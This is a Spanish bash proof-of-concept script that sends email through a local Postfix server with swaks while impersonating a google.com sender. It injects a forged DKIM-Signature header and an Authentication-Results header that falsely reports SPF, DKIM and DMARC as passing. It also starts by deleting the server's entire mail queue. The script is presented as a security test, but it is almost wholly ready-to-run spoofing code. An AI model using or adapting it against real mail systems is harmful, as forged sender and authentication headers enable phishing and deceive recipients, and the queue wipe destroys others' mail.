#!/bin/bash
##################################################
# Prueba de concepto POC, requiere smarks
# suplanta a google.com
# simula cabeceras X-Mailer modificadas
# simula verificaciones SPF, DKIN, DMARK
# (R) hackingyseguridad.com 2025
# @antonio_taboada
################################################

# Borra cola de correos en SMTP localhost
postsuper -d ALL

send_email_swaks() {
    local from_email="notificaciones@google.com"
    local to_email="antonio.taboada@telefonica.net"

    echo "..."
    swaks --to "$to_email" \
          --from "$from_email" \
          --server localhost \
          --h-Subject "Prueba" \
          --h-From "Notificacion <$from_email>" \
          --h-DKIM-Signature "v=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=selector1; t=$(date +%s)" \
          --h-Authentication-Results "mx.google.com; spf=pass; dkim=pass; dmarc=pass" \
          --body "correo electronico de prueba con todas las verificaciones de seguridad suplantadas en la X cabeceras . ;) http://www.hackingyseguridad.com/" \
          --add-header "X-Priority: 1" \
          --add-header "Importance: high"
}
    send_email_swaks
echo
postqueue -f
echo
echo "-> Para limpiar la cola de envio del servidor SMTP en localhost: postsuper -d ALL"
echo
sleep 3
mailq
echo "..."
echo

echo "Ultimos Logs Postfix : "
echo "========================================================================"
    if command -v journalctl &>/dev/null; then
        journalctl -u postfix -n 20 --since "1 minute ago" 2>/dev/null || \
        tail -20 /var/log/mail.log 2>/dev/null || \
        echo "[!] No se pudieron leer los logs. Revisa manualmente."
    else
        tail -30 /var/log/mail.log 2>/dev/null || \
        echo "[!] Archivo de logs no accesible."
    fi

    echo "...."

